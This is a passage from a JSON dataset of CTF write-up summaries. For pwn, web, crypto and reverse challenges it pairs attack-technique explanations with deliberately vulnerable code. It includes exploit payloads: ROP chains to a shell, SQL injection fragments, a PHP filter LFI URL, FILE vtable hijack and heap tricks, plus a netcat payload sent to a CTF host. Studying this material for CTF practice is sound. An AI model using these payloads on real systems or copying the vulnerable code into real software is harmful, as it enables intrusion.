            "Buffer overflow vulnerabilities can be exploited to bypass protections and manipulate execution flow in binaries. When the binary reads user input into a buffer without limiting the number of bytes based on the buffer size, an attacker can overflow the buffer into adjacent memory. This can be combined with knowledge of the Global Offset Table (GOT) and Procedure Linkage Table (PLT) to redirect execution flow, even when direct calls to PLT functions are not possible due to modifications like clearing the GOT. The exploit process involves constructing a ROP chain to execute system calls directly, manipulate GOT entries, and leverage PLT addresses to restore functionality of the binary or call system functions.\n   - Example payload for redirecting execution flow and manipulating GOT entries via buffer overflow:\n     ```python\n     payload = b\"A\"*0x58 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(got_start) + p64(0) + p64(syscall_ret) + p64(elf.sym.main)\n     ```",
            "After achieving control of the execution flow through buffer overflow and GOT manipulation, it's possible to leak addresses from the GOT to determine the versions of dynamically linked libraries used by the binary (such as libc). With the addresses from the GOT, an attacker can calculate the base address of these libraries in memory. This allows for the execution of arbitrary code or system commands by leveraging \"one_gadget\" addresses or similar executable code snippets within these libraries. This technique is especially useful for bypassing non-executable stack protections and achieving remote code execution.\n   - Example payload for leaking libc addresses and executing a \"one_gadget\" to get a shell:\n     ```python\n     leak_payload = p64(pop_rdi) + p64(elf.sym.got[\"puts\"]) + p64(elf.sym.plt[\"puts\"]) + p64(elf.sym.main)\n     exec_payload = b\"C\"*0x58 + p64(libc.address + one_shot_offset) + b\"\\x00\"*0x100\n     ```"
        ],
        "key": "```c  \nundefined8 main(void)  \n{  \n undefined buff [80];  \n puts(\"ROP me ;)\");  \n printf(\"> \");  \n read(0,buff,0xf0);  \n clear_got();  \n return 0;  \n}  \n```"
    },
    {
        "name": "EXtravagant",
        "write_up": "dataset/raw/EXtravagant.md",
        "type": "This write-up is for a forensics challenge.",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 50,
        "max_score": 2199,
        "difficulty": 0.022737608003638016,
        "knowledge": [
            "When exploiting web applications developed with Flask (or similar web frameworks), if the application improperly handles user input in regular expressions (regex), you can inject regex patterns to either bypass security checks or manipulate the query to access restricted data. In this scenario, by injecting a specific regex pattern (`A.*`) into a parameter expected to be part of a regex search, you can manipulate the search logic to return unintended results, potentially exposing sensitive information or system data (like a flag). This is particularly useful when the application concatenates user input directly into a regex pattern without proper sanitization or validation.",
            "If a web application uses regex search with settings (like case sensitivity) influenced by user-controlled inputs, it's possible to alter the behavior of the regex search by manipulating those inputs. By injecting a value that internally enables options similar to `re.IGNORECASE`, an attacker can bypass case-sensitive security mechanisms or filters, broadening the scope of a regex injection attack to reveal information that would otherwise be protected by case-sensitive checks. This method evidences the need for careful validation and sanitization of all user inputs, especially when they influence the logic or configuration of security-sensitive operations like regex searches."
        ],
        "key": "```python  \n#!/usr/bin/env python\n\nfrom flask import Flask, Response, abort, request, render_template  \nimport random  \nfrom string import *  \nimport re\n\napp = Flask(__name__)\n\nflag = open(\"flag.txt\").read()  \nusers = open(\"users.txt\").read()\n\nusers += flag\n\n@app.route(\"/\", methods=[\"GET\", \"POST\"])  \ndef index():  \n   if request.method == \"GET\":  \n       return render_template(\"lookup.html\")  \n   if request.method == \"POST\":  \n       name = request.form[\"name\"]  \n       setting = int(request.form[\"setting\"])  \n       if name:  \n           if name[0].isupper():  \n               name = name[1:]\n\n       results = re.findall(r\"[A-Z][a-z]*?\" + name + r\"[a-z]*?\\n\", users, setting)  \n       results = [x.strip() for x in results if x or len(x) > 1]\n\n       return render_template(\"lookup.html\", passed_results=True, results=results)\n\nif __name__ == \"__main__\":  \n   app.run()  \n```"
    },
    {
        "name": "Ez PDF 100",
        "write_up": "dataset/raw/Ez PDF 100.md",
        "type": "pwn",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing PDF files for hidden information or flags, two common techniques include visually inspecting elements (such as images) using a PDF viewer and searching for encoded strings (e.g., base64) by opening the PDF with a text editor. For base64 encoded strings specifically, decoding them may reveal parts of or whole flags.\n   - Example of base64 encoded string to be decoded: `SW4gdGhpcyBxdWVzdGlvbiwgdGhlIGZsYWcgaGFzIGJlZW4gZGl2aWRlZCBpbnRvIDMgcGFydHMuIFlvdSBoYXZlIGZvdW5kIHRoZSBmaXJzdCBwYXJ0IG9mIHRoZSBmbGFnISEgVENQMVB7RDAxbjlfRjAyM241MUM1`",
            "For challenges involving nested zip files that require automated extraction, a Python script utilizing `os.system` with appropriate `find`, `unzip`, and `rm` commands can be employed to sequentially extract each file and potentially retrieve the password for the next layer from a text file until the final flag is reached.\n   - Example code snippet to automate the extraction:\n     ```python\n     import os\n\n     zip_number = 25000  # Total number of nested zip files.\n     cmd1 = \"find . -name '*.zip' -exec unzip -o -P \"  # Command to find and unzip files.\n     cmd2 = \" {} \\; -exec rm {} \\;\"  # Command to remove the zip file after extraction.\n\n     file = open(\"password.txt\", \"r\")  \n     pswd = (file.read()).strip()  # Read the initial password.\n     file.close()\n\n     for i in range(1, zip_number):  \n         os.system(cmd1 + pswd + cmd2)  # Execute the unzip and remove command with the current password.\n         \n         file = open(\"password.txt\", \"r\")  \n         pswd = (file.read()).strip()  # Update password for the next iteration.\n         file.close()\n     ```"
        ],
        "key": "```c\n#include <stdio.h>  \n#include <stdlib.h>\n\nchar buff[20];  \nint buff2;\n\nvoid setup(){  \n\tsetvbuf(stdin, buff, _IONBF, 0);  \n\tsetvbuf(stdout, buff, _IONBF, 0);  \n\tsetvbuf(stderr, buff, _IONBF, 0);  \n}\n\nvoid flag_handler(){  \n\tFILE *f = fopen(\"flag.txt\",\"r\");  \n        if (f == NULL) {  \n        printf(\"Cannot find flag.txt!\");  \n        exit(0);  \n }  \n}\n\nvoid buffer(){  \n\tbuff2 = 0;  \n\tprintf(\"Can you get the exact value to print the flag?\\n\");  \n\tprintf(\"Input: \");  \n\tfflush(stdout);  \n\tgets(buff);  \n\tif (buff2 > 5134160) {  \n\t\tprintf(\"Too high!\\n\\n\");  \n\t} else if (buff2 == 5134160){  \n\t\tprintf(\"Congrats, You got the right value!\\n\");  \n\t \tsystem(\"cat flag.txt\");  \n\t} else {  \n\t\tprintf(\"Sad, too low! :(, maybe you can add *more* value 0_0\\n\\n\");  \n\t}  \n\tprintf(\"\\nOutput : %s, Value : %d \\n\", buff, buff2);  \n}\n\nint main(){  \n\tflag_handler();  \n\tsetup();  \n\tbuffer();  \n}  \n```"
    },
    {
        "name": "Ez Ret 2 Win _",
        "write_up": "dataset/raw/Ez Ret 2 Win _.md",
        "type": "pwn",
        "competition": [
            "FwordCTF/2020",
            "https://ctftime.org/event/1066/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When dealing with return-to-win (ret2win) challenges that work locally but not remotely, consider the possibility that the address to jump to needs a minor adjustment due to stack alignment differences between environments. This can often be fixed by adding or subtracting a small value (e.g., +1) to the function address in your payload. Example adjustment in payload: payload += p64(binary.sym.rasengan + 1)",
            "In buffer overflow vulnerabilities, specifically when the vulnerable function is `gets()`, payload construction should ensure that the number of bytes sent exactly matches the distance from the input buffer to the return address plus the size of the address being overwritten. This precision is crucial in successfully redirecting execution flow to the desired function without causing unexpected behavior. Example payload construction for a buffer size of 0xa8 bytes: payload  = 0xa8 * b'A' + p64(target_function_address)"
        ],
        "key": "```c\n if (__fd == 0) {  \n   printf(\"Enter Your password to continue: \");  \n   gets(local_a8);  \n   printf(\"you typed \\'%s\\', Good Bye!\\n\",local_a8);  \n```\n\n```c\nundefined8 rasengan(void)  \n{  \n int iVar1;  \n FILE *__stream;  \n  \n __stream = fopen(\"flag.txt\",\"r\");  \n if (__stream == (FILE *)0x0) {  \n   perror(\"flag.txt not found! If this happened in the server contact the\nauthor please!\");  \n                   /* WARNING: Subroutine does not return */  \n   exit(1);  \n }  \n while( true ) {  \n   iVar1 = fgetc(__stream);  \n   if ((char)iVar1 == -1) break;  \n   putchar((int)(char)iVar1);  \n }  \n fclose(__stream);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Ezchallz",
        "write_up": "dataset/raw/Ezchallz.md",
        "type": "crypto",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": 100,
        "max_score": 940,
        "difficulty": 0.10638297872340426,
        "knowledge": [
            "In a challenge involving Local File Inclusion (LFI), PHP wrappers can be used to bypass limitations and retrieve source code of PHP files. This can be particularly useful in web challenges where direct access to the source code is restricted. A payload to use PHP filters for base64 encoding can be constructed as follows: `http://target/endpoint/?page=php://filter/read=convert.base64-encode/resource=filename`",
            "In challenges where cryptographic operations such as XOR are used in conjunction with hash functions to generate secret values, understanding the cryptographic operation and the hash function's behavior can enable the recovery of secret keys or salts. If the operation involves XORing a known hash (like an MD5 hash of a user-controlled value) with an unknown salt to create a directory or file name, one can reverse the process by XORing the known value with the result to recover the secret salt. This process requires creating a user or inputting a controlled value, observing the output (such as a directory name), and then applying XOR with the known hashed value to uncover the salt. A Python snippet demonstrating this technique:\n\n```python\nimport hashlib\n\ndef xor_strings(xs, ys):\n    return \"\".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))\n\nusername = \"known_username\"\nknown_dir_hex = \"resulting_directory_hex\"\nsalt_hex = xor_strings(hashlib.md5(username).hexdigest(), known_dir_hex)\nprint(\"Recovered salt in hex:\", salt_hex)\n```"
        ],
        "key": "```php\n<?php\nerror_reporting(0);\n\nfunction gendirandshowflag($username) {\n\tinclude('secret.php');\n\t$dname = \"\";\n\t$intro = \"\";\n\t$_username = md5($username, $raw_output = TRUE);\n\tfor($i = 0; $i<strlen($salt); $i++) {\n\t\t$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));\n\t};\n\t$dname = \"users/\" . bin2hex($dname);\n\techo 'You have successfully register as ' . $username . '!\\n';\n\tif ($_username === hex2bin('21232f297a57a5a743894a0e4a801fc3')) {\n\t\t$intro = \"Here is your flag:\" . $flag;\n\t}\n\telse {\n\t\t$intro = \"Here is your flag, but I'm not sure \ud83e\udd14: \\nMeePwnCTF{\" . md5(random_bytes(16) . $username) . \"}\";\n\t}\n\tmkdir($dname);\n\tfile_put_contents($dname . '/flag.php', $intro);\n\theader(\"Location: \". $dname . \"/flag.php\");\n}\n\nif (isset($_POST['username'])) {\n\tif ($_POST['username'] === 'admin') {\n\t\tdie('Username is not allowed!');\n\t}\n\telse {\n\t\tgendirandshowflag($_POST['username']);\n\t}\n}\n?>\n```"
    },
    {
        "name": "EZDSA",
        "write_up": "dataset/raw/EZDSA.md",
        "type": "crypto",
        "competition": [
            "CyberSecurityRumble/2020",
            "https://ctftime.org/event/1057/tasks/"
        ],
        "score": 200,
        "max_score": 1337,
        "difficulty": 0.14958863126402394,
        "knowledge": [
            "In a challenge involving ECDSA signature generation with a custom entropy function, if the entropy function is not truly random (e.g., a fixed or predictable value is used for the \"random\" `k` every time), the same `r` value will be produced for different messages. This vulnerability allows an attacker to deduce the constant `k` by observing repeated signatures and applying the ECDSA signature equation. Specifically, `k` can be calculated using the equation `k = (H(m1) - H(m2)) / (s1 - s2)`, where `H(m)` is the hash of the message `m` and `s` is the signature component of `(r, s)` for that message. This method relies on obtaining two signatures `(m1, r, s1)` and `(m2, r, s2)` for different messages `m1` and `m2`.",
            "Given the ability to indirectly deduce or calculate the nonce `k` used in the ECDSA signing process due to non-random or predictable entropy sources, it is viable to recover the private key from the signatures. The private key `d` can be calculated once `k` is known, using signatures `(r, s)` and message hashes `H(m)`, through the equation `x = (k*s - H(m)) / r`, which must be solved for `x` (representative of the private key material in some contexts). This method allows for signing arbitrary messages as if they were signed with the original private key, thus enabling spoofing of signatures for messages that were never actually signed by the legitimate key holder.\n\nSample Python snippet for calculating `k`:\n```python\nfrom ecdsa.numbertheory import inverse_mod\n\n# Assuming curve.order is the order of the curve being used, and variables are defined\nr_i = inverse_mod(r, curve.order)\nm_h_diff = (m_hash1 - m_hash2) % curve.order\n\nk = (m_h_diff * inverse_mod((sig1 - sig2), curve.order)) % curve.order\n```\n\nSample Python snippet for recovering the private key `d`:\n```python\ns_E = (((((sig1 * k) % curve.order) - m_hash1) % curve.order) * r_i) % curve.order\n```\nThese snippets illustrate the processes for first determining `k` and then exploiting it to compute values directly related to the private key, enabling further cryptographic operations as if in possession of the private key itself."
        ],
        "key": "```python\n#!/usr/bin/python2  \nfrom hashlib import sha1  \nfrom Crypto import Random  \nfrom flag import FLAG\n\nclass PrivateSigningKey:\n\n   def __init__(self):  \n       self.gen = 0x44120dc98545c6d3d81bfc7898983e7b7f6ac8e08d3943af0be7f5d52264abb3775a905e003151ed0631376165b65c8ef72d0b6880da7e4b5e7b833377bb50fde65846426a5bfdc182673b6b2504ebfe0d6bca36338b3a3be334689c1afb17869baeb2b0380351b61555df31f0cda3445bba4023be72a494588d640a9da7bd16L  \n       self.q = 0x926c99d24bd4d5b47adb75bd9933de8be5932f4bL  \n       self.p = 0x80000000000001cda6f403d8a752a4e7976173ebfcd2acf69a29f4bada1ca3178b56131c2c1f00cf7875a2e7c497b10fea66b26436e40b7b73952081319e26603810a558f871d6d256fddbec5933b77fa7d1d0d75267dcae1f24ea7cc57b3a30f8ea09310772440f016c13e08b56b1196a687d6a5e5de864068f3fd936a361c5L  \n       self.key = int(FLAG.encode(\"hex\"), 16)\n\n   def sign(self, m):\n\n       def bytes_to_long(b):  \n           return long(b.encode(\"hex\"), 16)\n\n       h = bytes_to_long(sha1(m).digest())  \n       u = bytes_to_long(Random.new().read(20))  \n       assert(bytes_to_long(m) % (self.q - 1) != 0)\n\n       k = pow(self.gen, u * bytes_to_long(m), self.q)  \n       r = pow(self.gen, k, self.p) % self.q  \n       s = pow(k, self.q - 2, self.q) * (h + self.key * r) % self.q  \n       assert(s != 0)\n\n       return r, s  \n```"
    },
    {
        "name": "ezpwn",
        "write_up": "dataset/raw/ezpwn.md",
        "type": "pwn",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "In buffer overflow challenges, analyzing the difference between the base pointer offsets of the variable to be overwritten and the buffer can guide in calculating the exact payload length required to overflow the variable's value. For example, if the difference in offsets is 24 bytes, the payload will need 24 \"A\"s to reach the target variable's memory location. Example payload for local exploitation: `python -c \"print 'A'*24 + 'BBBB' \"`. The \"BBBB\" can be replaced with the desired value to overwrite the target variable based on the little-endian format.",
            "When exploiting buffer overflow vulnerabilities remotely, factors such as different operating environments may require adjustments in the payload size. Initial assumptions based on local exploitation may need to be revised. In this context, if local exploitation requires a 24-byte buffer to reach the target variable but remote exploitation seems ineffective, increasing the buffer size systematically can identify the correct buffer length needed for successful exploitation. Example payload for remote exploitation: `python -c \"print 'A'*28 + '\\x01\\x00\\x00\\x00'\" | nc fun.ritsec.club 8001`. This shows that while locally 24 \"A\"s were sufficient, remotely, the buffer size changed to 28 \"A\"s to effectively overwrite the target variable."
        ],
        "key": "```c\nint main(){\n\n   int x = 0;  \n   char buffer[20];  \n   FILE *f;\n\n   puts(\"Please enter your API key\");  \n   gets(buffer);  \n   f = fopen(\"flag.txt\",\"r\");  \n   if(x==1){  \n       int y;\n       while((y = fgetc(f)) != -1){  \n           putchar(y);  \n       }  \n       fclose(f);  \n   }  \n   printf(\"%d\\n\",x);  \n}  \n```"
    },
    {
        "name": "ezrev",
        "write_up": "dataset/raw/ezrev.md",
        "type": "reverse",
        "competition": [
            "Hayyim/2022",
            "https://ctftime.org/event/1553/tasks/"
        ],
        "score": 139,
        "max_score": 500,
        "difficulty": 0.278,
        "knowledge": [
            "When analyzing binaries for vulnerabilities or hidden values in a CTF challenge, patching binary instructions can forcefully manipulate program flow to assist in revealing sensitive information. Specifically, in scenarios where a binary performs checks before displaying a hidden string, altering register assignments and replacing subsequent instructions with `nop` (no operation) up to the point of a print function call can be effective. This method ensures that the hidden string is directly loaded into the correct register for output without being altered or checked. In the context provided, changing the instruction to load `target_string` into the `rdi` register instead of `rsi` and patching instructions between this load and the `puts` function call with `nop` can reveal the encoded flag. Example adjusted instruction: `48 8D 3D D9 26 00 00  lea rdi, target_string`.",
            "For challenges involving encoding or encryption routines implemented in software, reverse engineering the algorithm and reimplementing it can decode or decrypt the hidden message. When the encoding algorithm uses XOR operations with known values and possibly swapping certain bits around based on a pattern, a reverse script can be constructed to apply the inverse of those operations. This approach requires analyzing the algorithm to understand the transformations applied to the input string, then coding a script that reverses these steps. In scenarios involving XOR with specific values and conditional transformations based on index positions, as shown by the reimplementation of the binary encoding in Python to reveal the flag, constructing a reverse script that iteratively applies the inverse operations (e.g., subtracting where there was addition, performing XOR with the same values, and reversing any bit swaps) will successfully decode the message. Example Python snippet for reversing XOR and swap operations:\n\n```python\na = [coded_integers]  # Array of integers representing encoded message.\n\n# Reverse transformation logic goes here, typically involving loops and conditionals.\nfor i in range(len(a)):\n    # Apply inverse operations based on original algorithm's logic.\n    # E.g., if original operation was a XOR with fixed value, reapply same XOR.\n\n# Decode and print out the original message from the transformed array.\nfor i in range(len(a)):\n    print(chr(a[i]), end=\"\")\n```"
        ],
        "key": "```c\n// Input flag  \nprintf(\"flag > \");  \n__isoc99_scanf(\"%s\", input);\n\n// Transform flag  \ninput_len = strlen(input);  \ntransform_input(input, input_len, (void **)&transformed_input);\n\n// Calculate a reference value for transformed flag  \nsub_15D8(1886873447);  \nx = a4;  \nv8 = (int)pow(a4, 2.0);  \ny = *(double *)&qword_4028 * *(double *)&qword_4020;  \nmagic = (int)fmod((double)v8, *(double *)&qword_4028 * *(double\n*)&qword_4020);  \nfor ( i = 0; i <= 0x2B; ++i )  \n target_string[i] ^= magic;\n\n// Compare transformed flag with its reference value and print result  \nif ( !strcmp(transformed_input, target_string) )  \n puts(\"congrats!\");  \nelse  \n puts(\"try again :)\");  \n```"
    },
    {
        "name": "Fake Registration",
        "write_up": "dataset/raw/Fake Registration.md",
        "type": "web",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 432,
        "max_score": 500,
        "difficulty": 0.864,
        "knowledge": [
            "For SQL injection challenges, especially when dealing with input length restrictions, commenting out the value separator allows for extending the effective length of the injection payload. This technique doubles the available space for the injection, enabling more complex queries within restricted environments.\n\nExample payload fragment:  \n```\nusername=a',(first part of subquery here/*  \npassword=*/second part of subquery here))--\n```",
            "In blind SQL injection scenarios where direct error messages or boolean conditions are not available, utilizing constraints errors (like null constraints on columns) can facilitate the extraction of data such as passwords. This method relies on triggering constraint violations to infer the presence or absence of specific conditions or values.\n\nExample logic for constructing a payload:  \nGenerate a unique username each attempt to bypass the checks and use a subquery to compare character by character of the target data (e.g., admin password). If a constraint violation (here, a non-empty password) is triggered, it indicates a successful match for the current character guess, allowing character-by-character brute-forcing of the target data."
        ],
        "key": "```python\nsql = f\"INSERT INTO `users`(username, password) VALUES ('{username}', '{password}')\"\ndb.execute_sql(sql)\n```"
    },
    {
        "name": "fakev",
        "write_up": "dataset/raw/fakev.md",
        "type": "pwn",
        "competition": [
            "m0leCon/2020/Quals",
            "https://ctftime.org/event/1025/tasks/"
        ],
        "score": -1,
        "max_score": 449,
        "difficulty": -1,
        "knowledge": [
            "In a challenge involving file handling and linked list manipulation, leveraging Use-After-Free (UAF) vulnerabilities enables reading from previously closed file descriptors. This can expose sensitive data left in memory, such as libc addresses, which are critical for bypassing ASLR in exploitation scenarios. This tactic is particularly effective when coupled with heap manipulations, like filling up `tcache` bins to control the memory layout and read contents of freed chunks.",
            "For challenges that allow controlling file structures within an application, it's possible to hijack the application's control flow by carefully crafting a fake file structure and manipulating function pointers. This involves understanding and exploiting the internal structure of file objects in libc, such as overriding the vtable pointer to point to a controlled location with malicious code or function pointers. By doing this, one can execute arbitrary code, such as spawning a shell, when the application performs operations on the fake file object. This method requires precise control over heap layout and knowledge of libc internals, including bypassing checks like `_IO_vtable_check` by placing the fake vtable in legitimate sections of libc.\n\nSample of payload to manipulate file structures and execute arbitrary code:\n```python\nfake_file = ''  \nfake_file += p64(0x2000)        # flags  \nfake_file += p64(0)             # _IO_read_ptr  \nfake_file += p64(0)             # _IO_read_end  \n...\nfake_file += p64(0)  \nfake_file += p64(0x602108) # file  \nfake_file += p64(0)        # next  \n...\nfake_file += p64(vtable-0x3a8-0x88) # vtable  \nfake_file += p64(system)            # alloc_buffer\n```"
        ],
        "key": "```cpp\nnew_node = (node_t *)malloc(0x10uLL);  \nif ( !new_node )  \n{  \n  perror(\"Couldn't alloc\");  \n  exit(1);  \n}  \nnode->next = (node_t *)&stac;;                // set next to stack  \nnode->next->file = (_QWORD *)fp;  \nnode->next->next = 0LL;  \n```"
    },
    {
        "name": "Faking till you're Making",
        "write_up": "dataset/raw/Faking till you're Making.md",
        "type": "The type of this CTF challenge is **pwn**.",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": 486,
        "max_score": 1000,
        "difficulty": 0.486,
        "knowledge": [
            "In challenges involving heap exploitation where the program exhibits control over heap data and executes a free operation on a pointer arithmetic result (e.g., `free(data + 2)`), one can leverage the House of Spirits technique. This technique exploits the vulnerability by freeing a crafted fake chunk to control the tcache list. Such manipulation allows for the redirection of the program's execution flow to attacker-controlled code, like a win function in this scenario. A crucial step in employing the House of Spirits technique is crafting a fake chunk with an appropriate size field to match the allocation request, ensuring it is inserted into the tcache list for the targeted size class (e.g., aligning the fake chunk size with an upcoming `malloc` size, including metadata overhead).\n\nSample payload for crafting a fake chunk and triggering the vulnerability:\n```python\nfake_chunk1 = p64(0) + p64(0x40) + 6*p64(0)  # Creates fake chunk with size 0x40 to insert into tcache of size 0x40.\n# Subsequent operations would include sending this fake chunk followed by exploiting the buffer overflow to overwrite the return address with the address of the win function.\n```",
            "In exploit scenarios where a buffer overflow is present in conjunction with a custom allocation pattern that leads to a controlled `malloc` call, one can overwrite critical program control data to hijack the program's execution flow. Typically, this involves taking advantage of inputs to overflow buffers and overwrite return addresses or function pointers. In the provided write-up, the overflow into `__s` from `fgets` is used to overwrite adjacent heap memory or stack data (based on the memory layout and specifics of the overflow), allowing for an arbitrary code execution vulnerability by redirecting execution to the `sh` function that spawns a shell.\n\nSample method to exploit buffer overflow for redirection of execution flow:\n```python\n# Assuming the address of the win function (sh) is known and the overflow allows for overwriting a return address\npayload = b\"A\"*offset + p64(addr_sh)\n# 'offset' is the number of bytes required to reach the return address from the start of the buffer '__s'\n# 'addr_sh' is the address of the 'sh' function that grants shell access\n```\n**Note:** Replace `addr_sh` with the actual address of the `sh` function as leaked or discovered through analysis. The exact payload structure depends on the specifics of the buffer overflow vulnerability, such as the size of the overflowable buffer and the memory layout."
        ],
        "key": "```c\nint main(void)  \n{  \n char *__s;  \n ulonglong data [10];  \n char *b;  \n ulonglong *a;  \n setvbuf(stdout,(char *)0x0,2,0);  \n printf(\"%p\\n\",sh);  \n malloc(1);  \n read(0,data,0x50);  \n free(data + 2);  \n __s = (char *)malloc(0x30);  \n fgets(__s,0x404,stdin);  \n return 0;  \n}  \n```"
    },
    {
        "name": "Farm",
        "write_up": "dataset/raw/Farm.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 41,
        "max_score": 477,
        "difficulty": 0.0859538784067086,
        "knowledge": [
            "When given an encryption algorithm that involves mathematical operations in a finite field, such as Galois Field ($GF(64)$) in this case, the resulting key from operations (such as multiplication) within this field will still be an element of the field. This significantly reduces the key space and makes brute-forcing feasible if the field size is small. In scenarios where encryption keys are derived from products or other operations within a small finite field, one can brute-force the key by iterating over all elements in the field rather than considering the seemingly larger initial key space.",
            "To decrypt messages that were encrypted using operations in a Galois Field and combined with other operations like base64 encodings, one must reverse each step in the encryption process. This involves:\n      - Iterating over possible keys in the field.\n      - Applying the inverse operations in the correct order, which could typically involve base64 decoding after reversing any mathematical operations done with the key.\n      - Catching exceptions during decryption attempts to skip invalid computations or key guesses that do not result in valid encoding schemes or base64 decodable content.\n    \n    Example payload for decryption driven by brute-forcing over a field of size 64:\n    ```python\n    for possible_key in GF(64):  \n       try:  \n           # Attempt to decrypt with this key\n           plaintext = decrypt_function(encrypted_message, possible_key)  \n           if b\"expected_content\" in plaintext:  \n               print(plaintext.decode())  \n       except:  \n           # Skip invalid keys\n           continue\n    ```"
        ],
        "key": "```python  \n#!/usr/bin/env sage\n\nfrom sage.all import *  \nimport string, base64, math  \nfrom flag import flag\n\nALPHABET = string.printable[:62] + '\\\\='\n\nF = list(GF(64))\n\ndef keygen(l):  \n   key = [F[randint(1, 63)] for _ in range(l)]  \n   key = math.prod(key) # Optimization the key length :D  \n   return key\n\ndef maptofarm(c):  \n   assert c in ALPHABET  \n   return F[ALPHABET.index(c)]\n\ndef encrypt(msg, key):  \n   m64 = base64.b64encode(msg)  \n   enc, pkey = '', key**5 + key**3 + key**2 + 1  \n   for m in m64:  \n       enc += ALPHABET[F.index(pkey * maptofarm(chr(m)))]  \n   return enc\n\n# KEEP IT SECRET  \nkey = keygen(14) # I think 64**14 > 2**64 is not brute-forcible :P\n\nenc = encrypt(flag, key)  \nprint(f'enc = {enc}')  \n```"
    },
    {
        "name": "Fast Calculator",
        "write_up": "dataset/raw/Fast Calculator.md",
        "type": "The type of challenge described in the write-up is a **reverse** challenge.",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "When handling IEEE-754 special values in program logic, especially in checks for negative values, NaN (Not a Number), and infinity, it is essential to account for edge cases like `-0.0`, which is considered negative but is not less than `0.0`. This can lead to logic errors if not handled correctly. In C, the `signbit()` function can be used to detect if a floating-point number, including `-0.0`, is negative. This is particularly useful in scenarios where the output of mathematical operations influences program flow or outcomes such as in decryption algorithms.\n   - Example code snippet to detect if a value is negative, including `-0.0`: `if (signbit(input)) {/* Handle negative, including -0.0 */}`",
            "To ensure accurate handling of Nan and infinity in mathematical operations or program logic, `isnan()` and `isinf()` functions from the math library should be utilized. This is crucial in programs relying on floating-point calculations to make decisions, such as bit manipulation based on the result of calculations. Implementing these checks prevents potentially skipping over necessary operations or incorrectly processing values, which is critical in solving CTF challenges that involve manipulating or decrypting data based on specific calculation outcomes.\n   - Example condition to check if the result of an operation should cause a bit flip based on being NaN, infinity, or negative:\n     ```c\n     int will_flip(double input) {\n       if (signbit(input)) return 1;  // Checks for negative including -0.0\n       if (isnan(input)) return 1;    // Checks if input is NaN\n       if (isinf(input)) return 1;    // Checks if input is infinity\n       return 0;\n     }\n     ```"
        ],
        "key": "```c\nbool isNegative(double param_1)  \n{  \n return param_1 < 0.0;  \n}\n\nundefined8 isNotNumber(void)\n{  \n return 0;  \n}\n\nundefined8 isInfinity(void)\n{  \n return 0;  \n}  \n```"
    },
    {
        "name": "Federation Workflow System",
        "write_up": "dataset/raw/Federation Workflow System.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 119,
        "max_score": 500,
        "difficulty": 0.238,
        "knowledge": [
            "When exploiting AES-ECB encryption vulnerabilities, if the application prepends a controllable input to a secret value before encryption, you can leverage this to decrypt the secret one byte at a time. This technique relies on the ECB mode's property of deterministic encryption for identical plaintext blocks. You craft inputs such that the block boundary aligns just before the start of the secret, then brute-force each byte of the secret by comparing the encrypted block against all possible byte values. This method requires you to control the preceding text to align block boundaries as needed and predict the length of secret data to set correct recovery blocks in your code.",
            "If a file path traversal vulnerability exists in an application, it's possible to access files outside of the intended directory by including '../' sequences in the file path. This can be particularly useful for accessing configuration files or secrets that are stored outside the web root or in parent directories not directly accessible through the application. This technique allows for the bypassing of rudimentary path sanitization measures that do not account for such directory traversal sequences."
        ],
        "key": "```python  \ndef sanitize(self, file):  \n   try:  \n       if file.find('\\x00') == -1:  \n           file_name = file  \n       else:  \n           file_name = file[:file.find('\\x00')]\n\n       file_path = os.path.realpath('files/{0}'.format(file_name))\n\n       if file_path.startswith(os.getcwd()):  \n           return file_path  \n       else:  \n           return None  \n```\n\n```python  \ndef totp(self, secret):  \n   counter = pack('>Q', int(time()) // 30)  \n   totp_hmac = hmac.new(secret.encode('UTF-8'), counter, sha1).digest()  \n   offset = ord(totp_hmac[19]) & 15  \n   totp_pin = str((unpack('>I', totp_hmac[offset:offset + 4])[0] & 0x7fffffff)\n% 1000000)  \n   return totp_pin.zfill(6)  \n```"
    },
    {
        "name": "Feed_me",
        "write_up": "dataset/raw/Feed_me.md",
        "type": "This write-up corresponds to a reverse challenge.",
        "competition": [
            "Pragyan/2019",
            "https://ctftime.org/event/755/tasks/"
        ],
        "score": 150,
        "max_score": 400,
        "difficulty": 0.375,
        "knowledge": [
            "When analyzing C programs, especially in CTF challenges for understanding vulnerabilities like buffer overflow, decompiling the executable with tools such as Ghidra can significantly simplify the analysis process. This approach allows seeing the program's logic in a more readable format, making it easier to identify conditions to exploit or understand how data is manipulated.",
            "If a program uses scanf (or similar functions) to read into sequentially declared character arrays without proper bounds checking, it is possible to perform a buffer overflow attack. This vulnerability can be exploited by crafting an input that exceeds the target buffer size, allowing the attacker to overwrite adjacent memory locations. In situations where these memory locations are used to store critical variables (such as condition checks for releasing a flag), carefully structured inputs can manipulate these variables to achieve unintended outcomes, such as bypassing security checks or obtaining unauthorized access to information.  \n   - Example payload to exploit such buffer overflow and manipulate adjacent variables: `-0000065580000005028-000009404` where the payload's structure aims to overwrite multiple adjacent variables by filling beyond the buffer size and controlling the overflow into adjacent variable memory spaces."
        ],
